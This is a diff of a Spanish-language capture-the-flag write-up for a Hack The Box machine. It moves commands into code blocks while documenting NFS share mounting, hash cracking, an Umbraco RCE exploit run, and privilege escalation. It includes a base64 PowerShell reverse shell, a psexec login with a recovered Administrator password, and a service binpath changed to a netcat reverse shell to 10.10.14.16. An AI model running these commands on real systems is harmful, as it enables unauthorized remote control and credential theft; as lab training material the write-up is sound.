@@ -142,7 +142,13 @@ Nmap done: 1 IP address (1 host up) scanned in 102.15 seconds
 
 #### ffuf
 
-Al navegar a través del sitio disponible y no encontrar información relevante en primera instancia, se decidió enumerar directorios de manera automática mediante  `ffuf -c -ic -u http://10.10.10.180/FUZZ -w /usr/share/dirb/wordlists/common.txt`, encontrando así el directorio `umbraco` el cual no pareció común bajo el contexto del sitio.
+Al navegar a través del sitio disponible y no encontrar información relevante en primera instancia, se decidió enumerar directorios de manera automática mediante:
+
+```bash
+ffuf -c -ic -u http://10.10.10.180/FUZZ -w /usr/share/dirb/wordlists/common.txt
+```
+
+Encontrando así el directorio `umbraco` el cual no pareció común bajo el contexto del sitio.
 
 ![Directorio encontrado](images/enum_1.png)
 
@@ -163,7 +169,13 @@ Al identificar el servicio y encontrar que se trataba de exposición de puntos d
 
 ![Puntos de montaje disponibles](images/enum_3.png)
 
-Posteriormente, para poder navegar a través del directorio e interactuar cómodamente se creó la carpeta `/mnt/remote` y se ejecutó `sudo mount -t nfs 10.10.10.180:site_backups /mnt/remote -o nolock` para montar ahí lo expuesto en el servidor.
+Posteriormente, para poder navegar a través del directorio e interactuar cómodamente se creó la carpeta `/mnt/remote` y se ejecutó:
+
+```bash
+sudo mount -t nfs 10.10.10.180:site_backups /mnt/remote -o nolock
+```
+
+Para montar ahí lo expuesto en el servidor.
 
 Teniendo en consideración la búsqueda de credenciales, se buscaron patrones en texto claro en el punto de montaje.
 
@@ -177,7 +189,13 @@ Utilizando lo encontrado, se procedió a hacer otra búsqueda descartando así m
 
 ![Descarte de archivos](images/enum_6.png)
 
-Al ser interpretado como binario, se uso `strings Umbraco.pdf` para interpretar los caracteres legibles identificando así las credenciales `admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa`.
+Al ser interpretado como binario, se uso:
+
+```bash
+strings Umbraco.pdf
+```
+
+Para interpretar los caracteres legibles identificando así las credenciales `admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa`.
 
 ![Credenciales expuestas](images/enum_7.png)
 
@@ -185,17 +203,33 @@ Al ser interpretado como binario, se uso `strings Umbraco.pdf` para interpretar 
 
 ## Cracking de hash obtenido
 
-Guardando el hash del usuario admin en un archivo y haciendo uso de `john hashes --wordlist=/usr/share/wordlists/rockyou.txt` se obtuvo la contraseña `admin@htb.local:baconandcheese`.
+Guardando el hash del usuario admin en un archivo y haciendo uso de:
+
+```bash
+john hashes --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+Se obtuvo la contraseña `admin@htb.local:baconandcheese`.
 
 ![Crackeo de hash](images/exploit_1.png)
 
 ## RCE
 
-Después de validar las credenciales con el portal de umbraco y descargar el exploit previamente encontrado, se ejecutó `python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami` para corroborar su uso.
+Después de validar las credenciales con el portal de umbraco y descargar el exploit previamente encontrado, se ejecutó:
+
+```bash
+python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami
+```
+
+Para corroborar su uso.
 
 ![Ejecución de comando whoami](images/exploit_2.png)
 
-Haciendo uso de [Reverse Shell Generator](https://www.revshells.com/) se generó una reverse shell de powershell en base64 para entablar la conexión con `python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-e JABjAGwAaQBlAG4AdAAg[...]`.
+Haciendo uso de [Reverse Shell Generator](https://www.revshells.com/) se generó una reverse shell de powershell en base64 para entablar la conexión con:
+
+```bash
+python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-e JABjAGwAaQBlAG4AdAAg[...]'
+```
 
 ![Reverse shell](images/exploit_3.png)
 
@@ -203,7 +237,13 @@ Haciendo uso de [Reverse Shell Generator](https://www.revshells.com/) se generó
 
 ## Enumeración
 
-Verificando los privilegios que se tienen con el usuario obtenido haciendo uso de `whoami /all` se visualizó que el privilegio `SeImpersonatePrivilege` se encuentra habilitado, permitiendo su explotación haciendo uso de Rotten/JuicyPotato.
+Verificando los privilegios que se tienen con el usuario obtenido haciendo uso de:
+
+```powershell
+whoami /all
+``` 
+
+Se visualizó que el privilegio `SeImpersonatePrivilege` se encuentra habilitado, permitiendo su explotación haciendo uso de Rotten/JuicyPotato.
 
 ![SeImpersonatePrivilege habilitado](images/post_1.png)
 
@@ -219,7 +259,7 @@ En donde por curiosidad se tomó en consideración la exposición de credenciale
 
 También dentro de la salida de `winPEAS` se visualiza que se cuenta con acceso completo al servicio `UsoSvc`, lo que permitiría modificar las opciones del servicio y detener o iniciar su ejecución.
 
-![Extracción de contraseña](images/post_4.png)
+![Permisos de servicio UsoSvc](images/post_4.png)
 
 ## Escalación de privilegios
 
@@ -233,21 +273,45 @@ Al subir el script de powershell a la máquina, cargarlo como módulo en la sesi
 
 *El mismo proceso puede ser realizado con el módulo de metasploit, sin embargo, es necesario tener una sesión abierta preferentemente de meterpreter (al tiempo que se resolvió la máquina el payload ejecutado fue `windows/meterpreter_reverse_tcp`)*
 
-Probando posteriormente la contraseña con el usuario Administrator mediante `impacket-psexec 'Administrator:!R3m0te!@10.10.10.180'`, obteniendo así acceso como `NT AUTHORITY\SYSTEM`.
+Probando posteriormente la contraseña con el usuario Administrator mediante:
 
-![Extracción de contraseña](images/post_6.png)
+```bash
+impacket-psexec 'Administrator:!R3m0te!@10.10.10.180'
+```
+
+Obteniendo así acceso como `NT AUTHORITY\SYSTEM`.
+
+![Acceso como nt authority system](images/post_6.png)
 
 #### Modificación de servicios
 
-Mediante `sc.exe qc UsoSvc` se puede ver más a detalle información respecto este servicio.
+Mediante:
+
+```powershell
+sc.exe qc UsoSvc
+```
+
+Se puede ver más a detalle información respecto este servicio.
 
 ![Información de servicio UsoSvc](images/post_7.png)
 
-Por lo que haciendo uso de `sc.exe config UsoSvc binpath="c:\windows\temp\nc.exe -e cmd.exe 10.10.14.16 4321"` se buscó la modificación de la ruta del binario a ejecutar sustituyéndola con la ejecución de netcat para entablar una reverse shell. Al consultar de nuevo la información del servicio, se observa la modificación del valor.
+Por lo que haciendo uso de:
+
+```powershell
+sc.exe config UsoSvc binpath="c:\windows\temp\nc.exe -e cmd.exe 10.10.14.16 4321"
+```
+
+Se buscó la modificación de la ruta del binario a ejecutar sustituyéndola con la ejecución de netcat para entablar una reverse shell. Al consultar de nuevo la información del servicio, se observa la modificación del valor.
 
 ![Cambio de ruta de binario](images/post_8.png)
 
-Por consiguiente al poner la conexión a la escucha y  realizar un reinicio del servicio `net stop UsoSvc && net start UsoSvc` se logró tener acceso como `NT AUTHORITY\SYSTEM` satisfactoriamente.
+Por consiguiente al poner la conexión a la escucha y  realizar un reinicio del servicio con:
+
+```powershell
+net stop UsoSvc && net start UsoSvc
+```
+
+Se logró tener acceso como `NT AUTHORITY\SYSTEM` satisfactoriamente.
 
 ![Acceso como nt authority system](images/post_9.png)
 
